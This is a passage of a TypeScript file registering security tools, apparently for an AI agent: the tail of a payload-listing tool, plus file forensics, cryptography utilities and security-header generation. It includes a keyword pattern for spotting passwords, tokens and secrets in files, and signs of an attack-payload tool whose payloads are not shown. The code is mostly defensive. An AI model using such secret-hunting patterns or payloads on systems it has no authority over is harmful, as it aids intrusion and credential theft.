        `**Count**: ${payloads.length} payloads`,
        '',
        '### Payloads',
        '',
      ]

      for (let i = 0; i < payloads.length; i++) {
        const p = payloads[i]
        const encoded = encode(p.payload, encoding)
        lines.push(`**${i + 1}. ${p.description}**`)
        lines.push('```')
        lines.push(encoded)
        lines.push('```')
        lines.push('')
      }

      lines.push('---')
      lines.push('**Disclaimer**: These payloads are for authorized security testing only. Unauthorized use against systems you do not own is illegal.')

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 18. forensics_analyze — File forensics
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'forensics_analyze',
    deprecated: true,
    description: 'File forensics analysis. Identify file type by magic bytes, extract printable ASCII strings, get file metadata, hex dump, and calculate Shannon entropy (high entropy = encrypted/compressed).',
    parameters: {
      file_path: { type: 'string', description: 'Path to file to analyze', required: true },
      action: { type: 'string', description: 'Action: headers, strings, metadata, hex_dump, entropy', default: 'headers' },
    },
    tier: 'free',
    async execute(args) {
      const filePath = String(args.file_path)
      const action = String(args.action || 'headers')

      if (!existsSync(filePath)) {
        return `Error: File not found: ${filePath}`
      }

      const lines: string[] = [
        '## File Forensics',
        '',
        `**File**: ${filePath}`,
        `**Action**: ${action}`,
        '',
      ]

      const stat = statSync(filePath)
      const data = readFileSync(filePath)

      switch (action) {
        case 'headers': {
          // Read first 16 bytes and identify file type
          const headerBytes = data.slice(0, 16)
          const hexHeader = Array.from(headerBytes).map(b => b.toString(16).padStart(2, '0')).join(' ')

          lines.push('### File Header (Magic Bytes)')
          lines.push('```')
          lines.push(hexHeader)
          lines.push('```')
          lines.push('')

          // Match against known signatures
          let identified = false
          for (const [sig, name] of FILE_SIGNATURES) {
            if (sig.every((byte, i) => data[i] === byte)) {
              lines.push(`**Identified as**: ${name}`)
              identified = true
              break
            }
          }

          if (!identified) {
            // Try text detection
            const isText = data.slice(0, Math.min(512, data.length)).every(
              b => (b >= 0x20 && b <= 0x7E) || b === 0x0A || b === 0x0D || b === 0x09
            )
            if (isText) {
              lines.push('**Identified as**: Plain text / ASCII file')
            } else {
              lines.push('**Identified as**: Unknown binary format')
            }
          }

          lines.push('')
          lines.push(`**Size**: ${stat.size.toLocaleString()} bytes`)
          break
        }

        case 'strings': {
          // Extract printable ASCII strings of length >= 4
          const strings: string[] = []
          let current = ''

          for (const byte of data) {
            if (byte >= 0x20 && byte <= 0x7E) {
              current += String.fromCharCode(byte)
            } else {
              if (current.length >= 4) {
                strings.push(current)
              }
              current = ''
            }
          }
          if (current.length >= 4) strings.push(current)

          lines.push(`### Extracted Strings (>= 4 chars)`)
          lines.push(`**Total strings found**: ${strings.length}`)
          lines.push('')

          // Show first 200 strings
          const display = strings.slice(0, 200)
          for (let i = 0; i < display.length; i++) {
            const s = display[i].length > 100 ? display[i].slice(0, 100) + '...' : display[i]
            lines.push(`${(i + 1).toString().padStart(4)}. \`${s}\``)
          }

          if (strings.length > 200) {
            lines.push(`... and ${strings.length - 200} more`)
          }

          // Highlight interesting strings
          const interesting = strings.filter(s =>
            /password|secret|key|token|api|auth|admin|root|private|bearer|jwt|cookie|session|flag\{|CTF/i.test(s)
          )
          if (interesting.length > 0) {
            lines.push('')
            lines.push('### Interesting Strings')
            for (const s of interesting.slice(0, 50)) {
              lines.push(`- \`${s.slice(0, 100)}\``)
            }
          }
          break
        }

        case 'metadata': {
          lines.push('### File Metadata')
          lines.push('| Field | Value |')
          lines.push('|-------|-------|')
          lines.push(`| Size | ${stat.size.toLocaleString()} bytes (${(stat.size / 1024).toFixed(2)} KB) |`)
          lines.push(`| Created | ${stat.birthtime.toISOString()} |`)
          lines.push(`| Modified | ${stat.mtime.toISOString()} |`)
          lines.push(`| Accessed | ${stat.atime.toISOString()} |`)
          lines.push(`| Changed | ${stat.ctime.toISOString()} |`)
          lines.push(`| Mode | ${stat.mode.toString(8)} |`)
          lines.push(`| UID | ${stat.uid} |`)
          lines.push(`| GID | ${stat.gid} |`)
          lines.push(`| Inode | ${stat.ino} |`)
          lines.push(`| Device | ${stat.dev} |`)
          lines.push(`| Links | ${stat.nlink} |`)
          lines.push(`| Is File | ${stat.isFile()} |`)
          lines.push(`| Is Directory | ${stat.isDirectory()} |`)
          lines.push(`| Is Symlink | ${stat.isSymbolicLink()} |`)

          // Hash the file
          const md5 = createHash('md5').update(data).digest('hex')
          const sha1 = createHash('sha1').update(data).digest('hex')
          const sha256 = createHash('sha256').update(data).digest('hex')
          lines.push('')
          lines.push('### File Hashes')
          lines.push(`- **MD5**: \`${md5}\``)
          lines.push(`- **SHA-1**: \`${sha1}\``)
          lines.push(`- **SHA-256**: \`${sha256}\``)
          break
        }

        case 'hex_dump': {
          // First 256 bytes as hex + ASCII
          const dumpSize = Math.min(256, data.length)
          lines.push(`### Hex Dump (first ${dumpSize} bytes)`)
          lines.push('```')

          for (let i = 0; i < dumpSize; i += 16) {
            const offset = i.toString(16).padStart(8, '0')
            const hexParts: string[] = []
            const asciiParts: string[] = []

            for (let j = 0; j < 16; j++) {
              if (i + j < dumpSize) {
                hexParts.push(data[i + j].toString(16).padStart(2, '0'))
                const byte = data[i + j]
                asciiParts.push(byte >= 0x20 && byte <= 0x7E ? String.fromCharCode(byte) : '.')
              } else {
                hexParts.push('  ')
                asciiParts.push(' ')
              }
            }

            const hex = hexParts.slice(0, 8).join(' ') + '  ' + hexParts.slice(8).join(' ')
            lines.push(`${offset}  ${hex}  |${asciiParts.join('')}|`)
          }

          lines.push('```')
          break
        }

        case 'entropy': {
          // Shannon entropy calculation
          const totalEntropy = calculateEntropy(data)

          lines.push('### Shannon Entropy Analysis')
          lines.push('')
          lines.push(`**Overall entropy**: ${totalEntropy.toFixed(4)} bits/byte (max: 8.0)`)
          lines.push('')

          // Classification
          let classification: string
          if (totalEntropy > 7.5) classification = 'Very high — likely encrypted or compressed'
          else if (totalEntropy > 6.5) classification = 'High — possibly compressed or compiled binary'
          else if (totalEntropy > 5.0) classification = 'Moderate — mixed content (code, data)'
          else if (totalEntropy > 3.5) classification = 'Low-moderate — likely text with some structure'
          else classification = 'Low — highly structured/repetitive data'

          lines.push(`**Classification**: ${classification}`)
          lines.push('')

          // Entropy by section (divide file into 8 sections)
          const sectionSize = Math.max(1, Math.floor(data.length / 8))
          lines.push('### Entropy by Section')
          lines.push('| Section | Offset | Entropy |')
          lines.push('|---------|--------|---------|')

          for (let i = 0; i < 8 && i * sectionSize < data.length; i++) {
            const start = i * sectionSize
            const end = Math.min(start + sectionSize, data.length)
            const section = data.slice(start, end)
            const sectionEntropy = calculateEntropy(section)
            const bar = '#'.repeat(Math.round(sectionEntropy * 4))
            lines.push(`| ${i + 1} | 0x${start.toString(16)} | ${sectionEntropy.toFixed(4)} ${bar} |`)
          }

          lines.push('')

          // Byte frequency histogram (top 10)
          const freq = new Map<number, number>()
          for (const byte of data) {
            freq.set(byte, (freq.get(byte) || 0) + 1)
          }
          const topBytes = [...freq.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10)

          lines.push('### Top 10 Most Common Bytes')
          lines.push('| Byte | Hex | Char | Count | % |')
          lines.push('|------|-----|------|-------|---|')
          for (const [byte, count] of topBytes) {
            const char = byte >= 0x20 && byte <= 0x7E ? String.fromCharCode(byte) : '.'
            const pct = ((count / data.length) * 100).toFixed(2)
            lines.push(`| ${byte} | 0x${byte.toString(16).padStart(2, '0')} | ${char} | ${count} | ${pct}% |`)
          }
          break
        }

        default:
          return `Error: Unknown action "${action}". Available: headers, strings, metadata, hex_dump, entropy`
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 19. crypto_tool — Cryptography utilities
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'crypto_tool',
    description: 'Cryptography utilities. Encrypt/decrypt with AES-256-CBC or AES-256-GCM, hash with MD5/SHA family, compute HMACs, generate key pairs, and derive keys with PBKDF2/scrypt.',
    parameters: {
      action: { type: 'string', description: 'Action: encrypt, decrypt, hash, hmac, keygen, derive', required: true },
      algorithm: { type: 'string', description: 'Algorithm (encrypt: aes-256-cbc, aes-256-gcm; hash: md5, sha1, sha256, sha512, sha3-256)' },
      data: { type: 'string', description: 'Input data', required: true },
      key: { type: 'string', description: 'Key for encrypt/decrypt/hmac' },
      output_format: { type: 'string', description: 'Output format: hex or base64', default: 'hex' },
    },
    tier: 'free',
    async execute(args) {
      const action = String(args.action).toLowerCase()
      const algorithm = String(args.algorithm || '').toLowerCase()
      const data = String(args.data)
      const key = args.key ? String(args.key) : undefined
      const outputFormat = String(args.output_format || 'hex') as 'hex' | 'base64'

      const lines: string[] = ['## Crypto Tool', '']

      try {
        switch (action) {
          case 'hash': {
            const algo = algorithm || 'sha256'
            const supportedHashes = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3-256', 'sha3-384', 'sha3-512']
            if (!supportedHashes.includes(algo)) {
              return `Error: Unsupported hash algorithm "${algo}". Supported: ${supportedHashes.join(', ')}`
            }

            const hash = createHash(algo).update(data).digest(outputFormat)
            lines.push(`**Algorithm**: ${algo.toUpperCase()}`)
            lines.push(`**Output format**: ${outputFormat}`)
            lines.push('')
            lines.push('### Result')
            lines.push('```')
            lines.push(hash)
            lines.push('```')
            lines.push('')
            lines.push(`**Input length**: ${data.length} chars`)
            lines.push(`**Hash length**: ${hash.length} chars`)

            // Also show other common hashes for comparison
            if (algo === 'sha256') {
              lines.push('')
              lines.push('### Additional Hashes')
              for (const a of ['md5', 'sha1', 'sha512']) {
                const h = createHash(a).update(data).digest(outputFormat)
                lines.push(`- **${a.toUpperCase()}**: \`${h}\``)
              }
            }
            break
          }

          case 'hmac': {
            if (!key) return 'Error: key parameter required for HMAC'
            const algo = algorithm || 'sha256'
            const hmac = createHmac(algo, key).update(data).digest(outputFormat)
            lines.push(`**Algorithm**: HMAC-${algo.toUpperCase()}`)
            lines.push(`**Output format**: ${outputFormat}`)
            lines.push('')
            lines.push('### Result')
            lines.push('```')
            lines.push(hmac)
            lines.push('```')
            break
          }

          case 'encrypt': {
            const algo = algorithm || 'aes-256-cbc'

            if (algo === 'aes-256-cbc') {
              // Generate key from password using PBKDF2 if key provided, else random
              const salt = randomBytes(16)
              const derivedKey = key
                ? pbkdf2Sync(key, salt, 100000, 32, 'sha256')
                : randomBytes(32)
              const iv = randomBytes(16)

              const cipher = createCipheriv('aes-256-cbc', derivedKey, iv)
              let encrypted = cipher.update(data, 'utf-8', outputFormat)
              encrypted += cipher.final(outputFormat)

              lines.push(`**Algorithm**: AES-256-CBC`)
              lines.push(`**Key derivation**: PBKDF2 (100,000 iterations, SHA-256)`)
              lines.push('')
              lines.push('### Encrypted Data')
              lines.push('```')
              lines.push(encrypted)
              lines.push('```')
              lines.push('')
              lines.push('### Decryption Parameters (save these!)')
              lines.push(`- **Salt**: \`${salt.toString('hex')}\``)
              lines.push(`- **IV**: \`${iv.toString('hex')}\``)
              if (!key) {
                lines.push(`- **Key**: \`${derivedKey.toString('hex')}\` (randomly generated)`)
              }

            } else if (algo === 'aes-256-gcm') {
              const salt = randomBytes(16)
              const derivedKey = key
                ? pbkdf2Sync(key, salt, 100000, 32, 'sha256')
                : randomBytes(32)
              const iv = randomBytes(12)

              const cipher = createCipheriv('aes-256-gcm', derivedKey, iv)
              let encrypted = cipher.update(data, 'utf-8', outputFormat)
              encrypted += cipher.final(outputFormat)
              const authTag = cipher.getAuthTag()

              lines.push(`**Algorithm**: AES-256-GCM (authenticated encryption)`)
              lines.push(`**Key derivation**: PBKDF2 (100,000 iterations, SHA-256)`)
              lines.push('')
              lines.push('### Encrypted Data')
              lines.push('```')
              lines.push(encrypted)
              lines.push('```')
              lines.push('')
              lines.push('### Decryption Parameters (save these!)')
              lines.push(`- **Salt**: \`${salt.toString('hex')}\``)
              lines.push(`- **IV**: \`${iv.toString('hex')}\``)
              lines.push(`- **Auth Tag**: \`${authTag.toString('hex')}\``)
              if (!key) {
                lines.push(`- **Key**: \`${derivedKey.toString('hex')}\` (randomly generated)`)
              }

            } else {
              return `Error: Unsupported encryption algorithm "${algo}". Supported: aes-256-cbc, aes-256-gcm`
            }
            break
          }

          case 'decrypt': {
            if (!key) return 'Error: key parameter required for decryption'
            const algo = algorithm || 'aes-256-cbc'

            // Expect data in format: salt:iv:ciphertext (or salt:iv:ciphertext:authtag for GCM)
            const parts = data.split(':')

            if (algo === 'aes-256-cbc') {
              if (parts.length < 3) {
                return 'Error: Encrypted data must be in format "salt:iv:ciphertext" (hex-encoded, colon-separated)'
              }
              const salt = Buffer.from(parts[0], 'hex')
              const iv = Buffer.from(parts[1], 'hex')
              const ciphertext = parts[2]

              const derivedKey = pbkdf2Sync(key, salt, 100000, 32, 'sha256')
              const decipher = createDecipheriv('aes-256-cbc', derivedKey, iv)
              let decrypted = decipher.update(ciphertext, outputFormat as any, 'utf-8')
              decrypted += decipher.final('utf-8')

              lines.push(`**Algorithm**: AES-256-CBC`)
              lines.push('')
              lines.push('### Decrypted Data')
              lines.push('```')
              lines.push(decrypted)
              lines.push('```')

            } else if (algo === 'aes-256-gcm') {
              if (parts.length < 4) {
                return 'Error: Encrypted data must be in format "salt:iv:ciphertext:authtag" (hex-encoded, colon-separated)'
              }
              const salt = Buffer.from(parts[0], 'hex')
              const iv = Buffer.from(parts[1], 'hex')
              const ciphertext = parts[2]
              const authTag = Buffer.from(parts[3], 'hex')

              const derivedKey = pbkdf2Sync(key, salt, 100000, 32, 'sha256')
              const decipher = createDecipheriv('aes-256-gcm', derivedKey, iv)
              decipher.setAuthTag(authTag)
              let decrypted = decipher.update(ciphertext, outputFormat as any, 'utf-8')
              decrypted += decipher.final('utf-8')

              lines.push(`**Algorithm**: AES-256-GCM (authenticated)`)
              lines.push('')
              lines.push('### Decrypted Data')
              lines.push('```')
              lines.push(decrypted)
              lines.push('```')

            } else {
              return `Error: Unsupported decryption algorithm "${algo}". Supported: aes-256-cbc, aes-256-gcm`
            }
            break
          }

          case 'keygen': {
            // Generate various types of keys
            lines.push('### Generated Keys')
            lines.push('')

            // Random bytes (for symmetric encryption)
            const key128 = randomBytes(16).toString('hex')
            const key256 = randomBytes(32).toString('hex')
            const key512 = randomBytes(64).toString('hex')

            lines.push('**Symmetric Keys (random)**:')
            lines.push(`- **128-bit**: \`${key128}\``)
            lines.push(`- **256-bit**: \`${key256}\``)
            lines.push(`- **512-bit**: \`${key512}\``)
            lines.push('')

            // UUID v4
            const uuid = [
              randomBytes(4).toString('hex'),
              randomBytes(2).toString('hex'),
              '4' + randomBytes(2).toString('hex').slice(1),
              ((parseInt(randomBytes(1).toString('hex'), 16) & 0x3f) | 0x80).toString(16) + randomBytes(1).toString('hex'),
              randomBytes(6).toString('hex'),
            ].join('-')
            lines.push(`**UUID v4**: \`${uuid}\``)
            lines.push('')

            // API key style
            const apiKey = 'sk_' + randomBytes(24).toString('base64url')
            lines.push(`**API Key style**: \`${apiKey}\``)
            lines.push('')

            // Password (passphrase)
            const passphraseWords = [
              'correct', 'horse', 'battery', 'staple', 'ocean', 'forest', 'mountain', 'river',
              'crystal', 'thunder', 'phantom', 'silver', 'golden', 'anchor', 'dragon', 'falcon',
              'quantum', 'nebula', 'cipher', 'matrix', 'vortex', 'zenith', 'prism', 'flux',
            ]
            const passphrase = Array.from({ length: 4 }, () =>
              passphraseWords[Math.floor(Math.random() * passphraseWords.length)]
            ).join('-')
            lines.push(`**Passphrase**: \`${passphrase}\``)
            lines.push('')

            // JWT secret
            const jwtSecret = randomBytes(32).toString('base64')
            lines.push(`**JWT Secret (base64)**: \`${jwtSecret}\``)
            break
          }

          case 'derive': {
            if (!key) return 'Error: key (password) parameter required for key derivation'
            const salt = data || randomBytes(16).toString('hex')
            const saltBuffer = Buffer.from(salt, salt.match(/^[a-f0-9]+$/i) ? 'hex' : 'utf-8')

            // PBKDF2
            const pbkdf2Key = pbkdf2Sync(key, saltBuffer, 100000, 32, 'sha256')
            lines.push('### PBKDF2')
            lines.push(`- **Iterations**: 100,000`)
            lines.push(`- **Hash**: SHA-256`)
            lines.push(`- **Salt**: \`${saltBuffer.toString('hex')}\``)
            lines.push(`- **Derived key (hex)**: \`${pbkdf2Key.toString('hex')}\``)
            lines.push(`- **Derived key (base64)**: \`${pbkdf2Key.toString('base64')}\``)
            lines.push('')

            // scrypt
            const scryptKey = scryptSync(key, saltBuffer, 32, { N: 16384, r: 8, p: 1 })
            lines.push('### scrypt')
            lines.push(`- **N**: 16384, **r**: 8, **p**: 1`)
            lines.push(`- **Salt**: \`${saltBuffer.toString('hex')}\``)
            lines.push(`- **Derived key (hex)**: \`${scryptKey.toString('hex')}\``)
            lines.push(`- **Derived key (base64)**: \`${scryptKey.toString('base64')}\``)
            break
          }

          default:
            return `Error: Unknown action "${action}". Available: encrypt, decrypt, hash, hmac, keygen, derive`
        }
      } catch (e: any) {
        lines.push(`**Error**: ${e.message}`)
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 20. security_headers_generate — Generate security headers
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'security_headers_generate',
    deprecated: true,
    description: 'Generate complete security header configurations for various frameworks. Includes CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and more. Returns framework-specific code ready to copy-paste.',
    parameters: {
      framework: { type: 'string', description: 'Framework: express, nextjs, nginx, apache, cloudflare, generic', default: 'generic' },
      policy: { type: 'string', description: 'Security policy level: strict, moderate, relaxed', default: 'strict' },
    },
    tier: 'free',
    async execute(args) {
      const framework = String(args.framework || 'generic').toLowerCase()
      const policy = String(args.policy || 'strict').toLowerCase()

      // Build headers based on policy level
      interface SecurityHeader {
        name: string
        value: string
        comment: string
      }

      const headers: SecurityHeader[] = []

      // CSP
      let csp: string
      switch (policy) {
        case 'strict':
          csp = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; media-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests"
          break
        case 'moderate':
          csp = "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https:; media-src 'self'; object-src 'none'; frame-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'"
          break
        case 'relaxed':
          csp = "default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src * data: blob:; font-src 'self' https: data:; connect-src 'self' https: wss:; media-src 'self' https: blob:; object-src 'none'; frame-src 'self' https:; base-uri 'self'; form-action 'self' https:"
          break
        default:
          csp = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'"
      }
      headers.push({ name: 'Content-Security-Policy', value: csp, comment: 'Controls which resources the browser is allowed to load' })

      // HSTS
      const hstsMaxAge = policy === 'strict' ? 63072000 : policy === 'moderate' ? 31536000 : 86400
      const hstsValue = `max-age=${hstsMaxAge}; includeSubDomains${policy === 'strict' ? '; preload' : ''}`
      headers.push({ name: 'Strict-Transport-Security', value: hstsValue, comment: 'Forces HTTPS for all future requests' })

      // X-Frame-Options
      const xfo = policy === 'strict' ? 'DENY' : 'SAMEORIGIN'
      headers.push({ name: 'X-Frame-Options', value: xfo, comment: 'Prevents clickjacking by controlling iframe embedding' })

      // X-Content-Type-Options
      headers.push({ name: 'X-Content-Type-Options', value: 'nosniff', comment: 'Prevents MIME type sniffing' })

      // Referrer-Policy
      const referrer = policy === 'strict' ? 'no-referrer' : policy === 'moderate' ? 'strict-origin-when-cross-origin' : 'no-referrer-when-downgrade'
      headers.push({ name: 'Referrer-Policy', value: referrer, comment: 'Controls how much referrer info is sent' })

      // Permissions-Policy
      let permissions: string
      switch (policy) {
        case 'strict':
          permissions = 'accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=(), interest-cohort=()'
          break
        case 'moderate':
          permissions = 'accelerometer=(), camera=(self), geolocation=(self), gyroscope=(), magnetometer=(), microphone=(self), payment=(self), usb=()'
          break
        case 'relaxed':
          permissions = 'camera=(self), geolocation=(self), microphone=(self), payment=(self)'
          break
        default:
          permissions = 'accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()'
      }
      headers.push({ name: 'Permissions-Policy', value: permissions, comment: 'Controls which browser features can be used' })

      // X-XSS-Protection (legacy but still useful)
      headers.push({ name: 'X-XSS-Protection', value: '1; mode=block', comment: 'Legacy XSS filter (CSP is the modern replacement)' })

      // Cross-Origin headers (strict only)
      if (policy === 'strict' || policy === 'moderate') {
        headers.push({ name: 'Cross-Origin-Opener-Policy', value: 'same-origin', comment: 'Isolates browsing context from cross-origin documents' })
        headers.push({ name: 'Cross-Origin-Resource-Policy', value: 'same-origin', comment: 'Prevents other origins from loading your resources' })
        headers.push({ name: 'Cross-Origin-Embedder-Policy', value: policy === 'strict' ? 'require-corp' : 'credentialless', comment: 'Controls cross-origin resource embedding' })
      }

      // Remove info headers
      const removeHeaders = ['X-Powered-By', 'Server']

      // Build output
      const lines: string[] = [
        '## Security Headers Configuration',
        '',
        `**Framework**: ${framework}`,
        `**Policy**: ${policy}`,
        `**Headers**: ${headers.length} set, ${removeHeaders.length} removed`,
        '',
      ]

      // Show header summary
      lines.push('### Headers')
      lines.push('')
      for (const h of headers) {
        lines.push(`- **${h.name}**: ${h.comment}`)
      }
      lines.push('')

      // Framework-specific code
      lines.push('### Implementation')
      lines.push('')

      switch (framework) {
        case 'express':
          lines.push('```typescript')
          lines.push('// Express.js security headers middleware')
          lines.push('import { Request, Response, NextFunction } from "express";')
          lines.push('')
          lines.push('export function securityHeaders(req: Request, res: Response, next: NextFunction) {')
          for (const h of headers) {
            lines.push(`  // ${h.comment}`)
            lines.push(`  res.setHeader("${h.name}", "${h.value}");`)
          }
          lines.push('')
          lines.push('  // Remove information disclosure headers')
          for (const rh of removeHeaders) {
            lines.push(`  res.removeHeader("${rh}");`)
          }
          lines.push('')
          lines.push('  next();')
          lines.push('}')
          lines.push('')
          lines.push('// Usage: app.use(securityHeaders);')
          lines.push('```')
          break

        case 'nextjs':
          lines.push('```typescript')
          lines.push('// next.config.js — Security headers')
          lines.push('const securityHeaders = [')
          for (const h of headers) {
            lines.push(`  {`)
            lines.push(`    key: "${h.name}",`)
            lines.push(`    value: "${h.value}",`)
            lines.push(`  },`)
          }
          lines.push('];')
          lines.push('')
          lines.push('module.exports = {')
          lines.push('  async headers() {')
          lines.push('    return [')
          lines.push('      {')
          lines.push('        // Apply to all routes')
          lines.push('        source: "/(.*)",')
          lines.push('        headers: securityHeaders,')
          lines.push('      },')
          lines.push('    ];')
          lines.push('  },')
          lines.push('  // Remove X-Powered-By')
          lines.push('  poweredByHeader: false,')
          lines.push('};')
          lines.push('```')
          break

        case 'nginx':
          lines.push('```nginx')
          lines.push('# Nginx security headers')
          lines.push('# Add to server {} or location {} block')
          lines.push('')
          for (const h of headers) {
            lines.push(`# ${h.comment}`)
            lines.push(`add_header ${h.name} "${h.value}" always;`)
            lines.push('')
          }
          lines.push('# Remove information disclosure headers')
          lines.push('server_tokens off;')
          lines.push('proxy_hide_header X-Powered-By;')
          lines.push('proxy_hide_header Server;')
          lines.push('```')
          break

        case 'apache':
          lines.push('```apache')
          lines.push('# Apache security headers')
          lines.push('# Add to .htaccess or httpd.conf')
          lines.push('')
          lines.push('<IfModule mod_headers.c>')
          for (const h of headers) {
            lines.push(`  # ${h.comment}`)
            lines.push(`  Header always set ${h.name} "${h.value}"`)
          }
          lines.push('')
          lines.push('  # Remove information disclosure headers')
          lines.push('  Header unset X-Powered-By')
          lines.push('  Header always unset X-Powered-By')
          lines.push('</IfModule>')
          lines.push('')
          lines.push('# Hide server version')
          lines.push('ServerTokens Prod')
          lines.push('ServerSignature Off')
          lines.push('```')
          break

        case 'cloudflare':
          lines.push('```javascript')
          lines.push('// Cloudflare Worker — Security headers')
          lines.push('export default {')
          lines.push('  async fetch(request, env) {')
          lines.push('    const response = await fetch(request);')
          lines.push('    const headers = new Headers(response.headers);')
          lines.push('')
          for (const h of headers) {
            lines.push(`    // ${h.comment}`)
            lines.push(`    headers.set("${h.name}", "${h.value}");`)
          }
          lines.push('')
          lines.push('    // Remove information disclosure headers')
          for (const rh of removeHeaders) {
            lines.push(`    headers.delete("${rh}");`)
          }
          lines.push('')
          lines.push('    return new Response(response.body, {')
          lines.push('      status: response.status,')
          lines.push('      headers,')
          lines.push('    });')
          lines.push('  },')
          lines.push('};')
          lines.push('```')
          break

        case 'generic':
        default:
          lines.push('```')
          lines.push('# Security Headers (generic — adapt to your server)')
          lines.push('')
          for (const h of headers) {
            lines.push(`# ${h.comment}`)
            lines.push(`${h.name}: ${h.value}`)
            lines.push('')
          }
          lines.push('# Headers to REMOVE:')
          for (const rh of removeHeaders) {
            lines.push(`# Remove: ${rh}`)
          }
          lines.push('```')
          break
      }

      lines.push('')
      lines.push('---')
      lines.push('')
      lines.push('### Testing')
      lines.push('Verify your headers at:')
      lines.push('- https://securityheaders.com')
      lines.push('- https://observatory.mozilla.org')
      lines.push('- `curl -I https://your-domain.com`')

      return lines.join('\n')
    },
  })
}
